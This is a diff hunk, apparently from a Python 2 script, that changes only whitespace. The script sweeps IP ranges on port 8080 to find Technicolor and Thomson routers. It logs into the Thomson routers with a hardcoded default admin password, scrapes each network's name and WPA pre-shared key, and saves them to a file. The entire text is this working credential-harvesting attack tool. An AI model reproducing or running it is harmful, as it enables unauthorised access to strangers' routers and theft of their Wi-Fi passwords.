@@ -17,14 +17,11 @@ for i in range(180,202):
             for a in range(0,255):
                 a=a+1
                 g=str(a)
-                
                 h=c+"."+l+"."+m+"."+g
-                
                 try:
                     r1=requests.get('http://'+str(h)+':8080/', timeout=0.3)
                     head=r1.headers
                     b='WWW-Authenticate' in head
-                    
                     if b==True:
                         r=requests.get('http://'+h+':8080/', timeout=0.3)
                         n=r.headers['WWW-Authenticate']=='Basic realm="Technicolor"'
@@ -40,19 +37,14 @@ for i in range(180,202):
                                     print str(h)+".....Technicolor......."+td.text[16:]+"....."+pwd["value"]
                         else: ##Thomson
                             tom=tom+1
-                            
                             r3=requests.get('http://'+h+':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=0.4)
                             r4=requests.get('http://'+h+':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=0.4)
-
-                            
                             parser=r4.content
                             bs1=BeautifulSoup(parser, "html.parser")
-                            
                             for t in bs1.find_all("td", align='middle'):
                                 for pws in bs1.find_all("input", {'name':"WpaPreSharedKey"}):
                                     router.write(h+','+'Thomson'+','+str(t.text[16:])+','+str(pws["value"])+','+'\n')
                                     print h+".....Thomson..........."+t.text[16:]+"....."+pws["value"]
-            
                 except requests.exceptions.ConnectTimeout:
                     pass
                 except requests.exceptions.ReadTimeout:
